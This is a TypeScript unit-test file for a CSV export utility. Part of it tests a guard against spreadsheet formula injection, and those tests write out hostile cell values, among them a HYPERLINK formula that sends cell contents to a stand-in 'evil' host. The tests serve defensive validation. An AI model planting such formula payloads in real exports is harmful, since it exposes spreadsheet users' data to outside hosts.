/**
 * Unit tests for the CSV utility (:mod:`web.src.lib.csv`).
 *
 * Coverage
 * ========
 * - empty rows: header-only output (no body lines)
 * - single row: header + 1 body line + trailing CRLF
 * - multiple rows: header + N body lines + trailing CRLF
 * - RFC 4180 escaping: commas, double quotes, newlines
 * - decimals: numeric columns with ``decimals: 2`` render
 *   as ``toFixed(2)`` (e.g. ``1.5`` -> ``"1.50"``)
 * - null / undefined: render as empty string
 * - downloadCsv SSR safety: no-op when ``document`` is undefined
 */
import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import { toCsv, downloadCsv, type CsvColumn } from "@/lib/csv";

interface TestRow {
  account_name: string;
  total_damage: number;
  dps: number;
  profession: string | null;
}

const COLUMNS: CsvColumn<TestRow>[] = [
  { field: "account_name", headerName: "Account" },
  { field: "total_damage", headerName: "Total damage" },
  { field: "dps", headerName: "DPS", decimals: 2 },
  { field: "profession", headerName: "Profession" },
];

describe("toCsv", () => {
  it("renders the header row only when there are no data rows", () => {
    const csv = toCsv<TestRow>([], COLUMNS);
    expect(csv).toBe("Account,Total damage,DPS,Profession\r\n");
  });

  it("serializes a single row with proper CRLF terminators", () => {
    const rows: TestRow[] = [
      {
        account_name: "Test.1234",
        total_damage: 1000,
        dps: 100,
        profession: "ELEMENTALIST",
      },
    ];
    const csv = toCsv(rows, COLUMNS);
    expect(csv).toBe(
      "Account,Total damage,DPS,Profession\r\n" +
        "Test.1234,1000,100.00,ELEMENTALIST\r\n",
    );
  });

  it("serializes multiple rows in order", () => {
    const rows: TestRow[] = [
      { account_name: "A.1", total_damage: 100, dps: 10, profession: "X" },
      { account_name: "B.2", total_damage: 200, dps: 20, profession: "Y" },
      { account_name: "C.3", total_damage: 300, dps: 30, profession: "Z" },
    ];
    const csv = toCsv(rows, COLUMNS);
    expect(csv).toBe(
      "Account,Total damage,DPS,Profession\r\n" +
        "A.1,100,10.00,X\r\n" +
        "B.2,200,20.00,Y\r\n" +
        "C.3,300,30.00,Z\r\n",
    );
  });

  it("quotes fields containing commas", () => {
    const rows: TestRow[] = [
      {
        account_name: "Has,Comma.1234",
        total_damage: 1,
        dps: 0.5,
        profession: "OK",
      },
    ];
    const csv = toCsv(rows, COLUMNS);
    expect(csv).toContain('"Has,Comma.1234"');
  });

  it("escapes internal double quotes by doubling them", () => {
    const rows: TestRow[] = [
      {
        account_name: 'Says"Hi.1234',
        total_damage: 1,
        dps: 0.5,
        profession: "OK",
      },
    ];
    const csv = toCsv(rows, COLUMNS);
    expect(csv).toContain('"Says""Hi.1234"');
  });

  it("quotes fields containing newlines", () => {
    const rows: TestRow[] = [
      {
        account_name: "Line1\nLine2.1234",
        total_damage: 1,
        dps: 0.5,
        profession: "OK",
      },
    ];
    const csv = toCsv(rows, COLUMNS);
    expect(csv).toContain('"Line1\nLine2.1234"');
  });

  it("renders null / undefined values as empty strings", () => {
    const rows: TestRow[] = [
      {
        account_name: "Test.1234",
        total_damage: 1,
        dps: 0.5,
        profession: null,
      },
    ];
    const csv = toCsv(rows, COLUMNS);
    // The profession column is the 4th field; it should be empty.
    expect(csv.endsWith(",\r\n")).toBe(true);
  });

  it("applies decimals formatting only to numeric columns with decimals set", () => {
    const rows: TestRow[] = [
      { account_name: "A", total_damage: 1234, dps: 1.5, profession: "X" },
    ];
    const csv = toCsv(rows, COLUMNS);
    // total_damage has no decimals -> raw "1234"
    expect(csv).toContain(",1234,");
    // dps has decimals: 2 -> "1.50"
    expect(csv).toContain(",1.50,");
  });

  it("returns empty string when no columns are supplied", () => {
    const csv = toCsv([{ a: 1 } as unknown as TestRow], []);
    expect(csv).toBe("");
  });
});

describe("csvEscape formula injection guard (v0.10.0)", () => {
  // Page 1 / 12: 6 trigger-character cases via `it.each`. Each
  // row is the input alone; the test computes the expected
  // CSV as ``header + CRLF + " + "' + input + " + CRLF`` per
  // the formula-guarded branch in :func:`csvEscape`.
  it.each([
    ["=HYPERLINK('https://evil','Click')"],
    ["+1+1"],
    ["-2+3"],
    ["@SUM(1:9)"],
    ["\t=SUM(1:9)"],
    ["\r=SUM(1:9)"],
  ])("prefixes with `'` and wraps in double quotes for trigger %j", (input) => {
    const csv = toCsv(
      [{ probe: input }],
      [{ field: "probe", headerName: "Probe" }],
    );
    // The expected output is " + ' + input + " (the leading
    // single-quote is the formula neutralizer; the surrounding
    // double-quotes are the RFC 4180 wrapper).
    expect(csv).toBe(`Probe\r\n"'${input}"\r\n`);
  });

  // Page 2 / 12: safe alphanumeric + dots + spaces (no
  // trigger, no RFC 4180 special char) -> unquoted.
  it("leaves alphanumeric strings untouched (safe path)", () => {
    const csv = toCsv(
      [{ probe: "Player.1234" }],
      [{ field: "probe", headerName: "Probe" }],
    );
    expect(csv).toBe("Probe\r\nPlayer.1234\r\n");
  });

  // Page 3 / 12: null value -> empty string, no formula
  // guard applied (the `value === null` short-circuit fires
  // BEFORE the regex).
  it("renders null values as empty strings", () => {
    const csv = toCsv(
      [{ probe: null as string | null }],
      [{ field: "probe", headerName: "Probe" }],
    );
    expect(csv).toBe("Probe\r\n\r\n");
  });

  // Page 4 / 12: undefined value -> empty string (same
  // short-circuit as null).
  it("renders undefined values as empty strings", () => {
    const csv = toCsv(
      [{ probe: undefined as string | undefined }],
      [{ field: "probe", headerName: "Probe" }],
    );
    expect(csv).toBe("Probe\r\n\r\n");
  });

  // Page 5 / 12: combined guard -- formula trigger AND an
  // internal double quote (the RFC 4180 inner-quote doubling
  // still happens INSIDE the formula-guarded prefix).
  it("applies the formula guard AND escapes internal double quotes", () => {
    const csv = toCsv(
      [{ probe: '=SUM("A1")' }],
      [{ field: "probe", headerName: "Probe" }],
    );
    // Expected: " + ' + =SUM(""A1"") + "
    // (where the 2 sequences of `""` are the literal
    // doubled internal double-quotes per RFC 4180).
    expect(csv).toBe(`Probe\r\n"'=SUM(""A1"")"\r\n`);
  });

  // Page 6 / 12: combined guard -- formula trigger + comma.
  // The comma doesn't trigger the RFC 4180 special-char
  // branch (the formula branch short-circuits) but the value
  // is still enclosed in double quotes via the formula guard.
  it("applies the formula guard AND escapes internal commas", () => {
    const csv = toCsv(
      [{ probe: "=A,B,C" }],
      [{ field: "probe", headerName: "Probe" }],
    );
    expect(csv).toBe(`Probe\r\n"'=A,B,C"\r\n`);
  });

  // Page 7 / 12: end-to-end integration test on a real
  // PlayerListRow with a hostile `name` column (the OWASP
  // attack vector). The benign column values render
  // unquoted; the hostile column is quoted + prefixed.
  it("integrates end-to-end on a real PlayerListRow with hostile name", () => {
    // Type-only inline import (avoids pulling PlayerListRow
    // into the test bundle at the top level -- the type is
    // canonical in :mod:`api`). The ``import(...)`` form in a
    // TYPE position (no ``await`` wrapper) is the canonical
    // TS pattern for dynamic type imports; the previous
    // ``(await import(...))["..."]`` form is a value position
    // and TS-errors on ``await`` in a type position.
    type Pr = import("@/lib/api").PlayerListRow;
    const hostileRows: Pr[] = [
      {
        account_name: "real.player.1234",
        name: "=HYPERLINK('https://evil?c='&A1,'Click')",
        profession: "MESMER",
        elite_spec: "BASE",
        fights_attended: 5,
        total_damage: 1000,
        total_healing: 500,
        total_buff_removal: 10,
        detected_role: "DPS",
        detected_tags: null,
      },
    ];
    const columns: CsvColumn<Pr>[] = [
      { field: "account_name", headerName: "Account" },
      { field: "name", headerName: "Name" },
      { field: "profession", headerName: "Profession" },
      { field: "elite_spec", headerName: "Spec" },
      { field: "fights_attended", headerName: "Fights" },
      { field: "total_damage", headerName: "Damage" },
      { field: "total_healing", headerName: "Healing" },
      { field: "total_buff_removal", headerName: "Strip" },
    ];
    const csv = toCsv(hostileRows, columns);
    // The hostile `name` column is wrapped + prefixed.
    expect(csv).toContain(`"'=HYPERLINK('https://evil?c='&A1,'Click')"`);
    // First column has no leading comma (it's the start of
    // the row); assert ``account_name`` appears immediately
    // after the CRLF that separates the header from the data
    // row (regex anchored at row start).
    expect(csv).toMatch(/\r\nreal\.player\.1234,/);
    // Mid-row columns are bounded by leading + trailing
    // commas (column 3 + 4).
    expect(csv).toContain(",MESMER,");
    expect(csv).toContain(",BASE,");
  });
});

describe("downloadCsv", () => {
  let originalCreateElement: typeof document.createElement;
  let originalAppendChild: typeof document.body.appendChild;
  let originalRemoveChild: typeof document.body.removeChild;
  let clickSpy: ReturnType<typeof vi.fn>;
  let appendSpy: ReturnType<typeof vi.fn>;
  let removeSpy: ReturnType<typeof vi.fn>;
  let createAnchor: ReturnType<typeof vi.fn>;
  let revokeSpy: ReturnType<typeof vi.fn>;
  let originalCreateObjectURL: typeof URL.createObjectURL;

  beforeEach(() => {
    clickSpy = vi.fn();
    appendSpy = vi.fn();
    removeSpy = vi.fn();
    createAnchor = vi.fn(() => ({
      href: "",
      download: "",
      rel: "",
      click: clickSpy,
    })) as unknown as ReturnType<typeof vi.fn>;
    revokeSpy = vi.fn();
    originalCreateObjectURL = URL.createObjectURL;
    URL.createObjectURL = vi.fn(() => "blob:mock-url") as typeof URL.createObjectURL;
    URL.revokeObjectURL = revokeSpy as typeof URL.revokeObjectURL;
    originalCreateElement = document.createElement;
    originalAppendChild = document.body.appendChild;
    originalRemoveChild = document.body.removeChild;
    document.createElement = createAnchor as unknown as typeof document.createElement;
    document.body.appendChild = appendSpy as unknown as typeof document.body.appendChild;
    document.body.removeChild = removeSpy as unknown as typeof document.body.removeChild;
  });

  afterEach(() => {
    document.createElement = originalCreateElement;
    document.body.appendChild = originalAppendChild;
    document.body.removeChild = originalRemoveChild;
    URL.createObjectURL = originalCreateObjectURL;
  });

  it("triggers a download via a hidden anchor click + revokes the object URL", () => {
    downloadCsv("test.csv", "a,b\r\n1,2\r\n");
    expect(createAnchor).toHaveBeenCalledWith("a");
    expect(appendSpy).toHaveBeenCalled();
    expect(clickSpy).toHaveBeenCalled();
    expect(removeSpy).toHaveBeenCalled();
    expect(revokeSpy).toHaveBeenCalledWith("blob:mock-url");
  });

  it("is a no-op when document is undefined (SSR safety)", () => {
    // ``vi.stubGlobal`` auto-restores the original value at
    // end-of-test, so the manual try/finally dance is not
    // needed (and there's no risk of leaking the stub into
    // sibling tests if an assertion throws).
    vi.stubGlobal("document", undefined);
    try {
      // Should not throw; should not invoke any DOM API.
      expect(() => downloadCsv("test.csv", "a,b\r\n1,2\r\n")).not.toThrow();
      expect(createAnchor).not.toHaveBeenCalled();
      expect(appendSpy).not.toHaveBeenCalled();
      expect(clickSpy).not.toHaveBeenCalled();
    } finally {
      vi.unstubAllGlobals();
    }
  });
});
